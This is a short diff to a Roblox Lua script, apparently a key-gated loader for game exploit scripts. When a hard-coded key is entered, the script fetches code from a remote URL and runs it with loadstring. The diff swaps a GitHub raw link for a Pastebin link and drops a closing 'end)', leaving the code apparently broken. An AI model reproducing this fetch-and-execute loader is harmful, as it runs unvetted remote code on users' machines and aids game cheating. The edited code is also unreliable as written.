@@ -120,8 +120,7 @@ c.MouseButton1Click:Connect(function()
 ts:Create(c, TweenInfo.new(.2, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, 0, true, 0), { TextColor3 = Color3.fromRGB(105,105,255) }):Play()
 if tb.Text == "Sh4rkM0n3y" then
 spawn(function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/TwistedGenius-xu/Spam-v1/refs/heads/main/twisted.genius",true))()
-end)
+loadstring(game:HttpGet("https://pastebin.com/raw/xBTz5KAX",true))()
 gui:Destroy()
 else
 tb.Text = "Invalid Key."
